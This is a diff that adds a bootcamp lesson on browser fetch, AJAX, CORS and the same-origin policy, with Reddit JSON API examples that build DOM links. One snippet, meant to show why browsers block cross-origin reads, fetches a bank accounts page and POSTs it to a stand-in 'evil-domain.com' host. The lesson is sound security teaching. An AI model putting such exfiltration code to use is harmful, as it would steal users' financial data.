@@ -351,6 +351,100 @@ theList.appendChild(newItem);
 Then try clicking on the sixth LI and notice the difference. It gets console.logged! This is event delegation in a nutshell, and you should use it wherever you can. This is also a great transition for the next section where we will learn about AJAX. Making HTTP requests in the context of a web page will often result in adding new elements dynamically. Setting up event delegation will enable us to listen to clicks on those new elements without having to manually attach event handlers to each one of them :)
 
 ### Making HTTP requests
-TODO
+Browser JavaScript would be pretty boring if all you could do was manipulate the page. What makes things really interesting is the ability to make HTTP requests in the context of an already loaded web page. This enables us to load external information, then use what we already learned to make that information appear on the page.
 
+Originally, this was accomplished with a contraption called `XMLHttpRequest` and the API for it was less than stellar. Modern browsers offer a much better alternative using the globally available `fetch` function. As a bonus, `fetch` uses Promises to give back its results, allowing us to write much nicer code.
+
+The process of fetching external information and updating the page as a result is often called AJAX, which stands for "Asynchronous JavaScript And XML". After four weeks of bootcamping, we now understand what asynchronous means. We also know what JavaScript means. We haven't really looked at XML. It turns out to be quite a heavy data format, both in terms of its size and its parsing. Many new APIs prefer to use the JSON format instead. Since JSON is native to JavaScript, this is great for us!
+
+Let's look at how we can use `fetch`, at first only to make an HTTP request, and then eventually to build something with it. Let's start by changing the code of `app.js` to the following:
+
+```javascript
+fetch('http://www.rbcroyalbank.com')
+.then(function(response) {
+  return response.text(); // Parsing the response as text returns another Promise so we chain it
+})
+.then(function(textResponse) {
+  console.log(textResponse);
+});
+```
+
+Try refreshing the browser and look at your Console tab. What's that? An error! What the browser is telling us here is that we're not allowed to see the response from the Royal Bank site. Since this request is running in the context of our web browser, this makes a LOT of sense. Because such a request would have access to our cookies, seeing the response could allow us to retrieve some sensitive information from anyone who loads up our web page in *their* browser.
+
+Imagine that we were allowed to see the content of this 3rd party site. Here's a hand-waving example of what we could do:
+
+```javascript
+fetch('https://www.onlinebank.com/accounts')
+.then(function(response) {
+  return response.text();
+})
+.then(function(textResponse) {
+  // We now have an HTML page with the user's bank accounts! Let's send it to ourselves!!
+  fetch('http://www.evil-domain.com/bank-accounts', {
+    method: 'POST',
+    body: textResponse
+  });
+});
+```
+
+Having setup such a page, we can then send the link to unsuspecting people and harvest all their banking information. Browsers prevent this behavior by default, and only allow us to look at the response of `fetch` requests when they are made to our own domain name, called the Origin.
+
+A system called CORS -- Cross-Origin Resource Sharing -- allows web servers to cooperate with web application builders. By setting appropriate headers in the HTTP response, a web server can tell the browser that the response can be allowed to be seen by the originator of the AJAX request. Your online bank would *never* do such a thing, but a lot of APIs offering publicly available information will enable CORS on some of their endpoints.
+
+One example of such an API is the Reddit JSON API. This is probably the last time we will look at Reddit in this bootcamp, because quite frankly we're starting to be fed up with it ;) Let's look at an example of making an AJAX call to the Reddit JSON API, parsing the result and doing something with it:
+
+```javascript
+fetch('https://www.reddit.com/r/montreal.json')
+.then(function(response) {
+  return response.json(); // Parsing as JSON returns a Promise, let's chain it
+})
+.then(function(jsonResponse) {
+  var posts = jsonResponse.data.children;
+
+  posts.forEach(function(post, i) {
+    console.log('Post #' + (i+1) + ': ' + post.data.title);
+  });
+});
+```
+
+Here we are retrieving the front page of r/Montreal and prining each title on the Console. Try it for yourself. From then on, the possibilities are endless. Rather than printing the result in the console, we can construct some DOM elements and display them on the page. Let's try to do that! Write the following code in `app.js`:
+
+```javascript
+fetch('https://www.reddit.com/r/montreal.json')
+.then(function(response) {
+  return response.json(); // Parsing as JSON returns a Promise, let's chain it
+})
+.then(function(jsonResponse) {
+  jsonResponse.data.children
+  .map(function(post) {
+    post = post.data; // Reddit has a weird format ;)
+
+    // Create a box for each post
+    var linkBox = document.createElement('p');
+
+    // Create a link element for each post
+    var link = document.createElement('a');
+    link.setAttribute('href', post.url);
+    link.setAttribute('target', '_blank'); // Make the link open in a new tab
+    link.innerText = post.title;
+
+    // Add the link to the paragraph
+    linkBox.appendChild(link);
+
+    // Return the paragraph from the map callback
+    return linkBox;
+  })
+  .forEach(function(linkParagraph) {
+    document.body.appendChild(linkParagraph);
+  });
+});
+```
+
+Try it again by refreshing the browser. As you can imagine, this AJAX code could be executed as a result of an event, a timer or anything else that you can implement using JavaScript.
+
+### "Conclusion"
+By marrying events, AJAX calls and DOM manipulation we can build fully functioning web applications that run in the browser. We'll do that in the next section by building three small web applications. One of the things that we'll see while doing this is that directly using the DOM can be quite cumbersome, and managing the state of our application can quickly get out of hand. Next week, we'll start looking at how to solve some of these problems in a declarative way using the [React UI library built by Facebook](https://facebook.github.io/react/).
 ---
+
+## Project #1: Weather App
+TODO
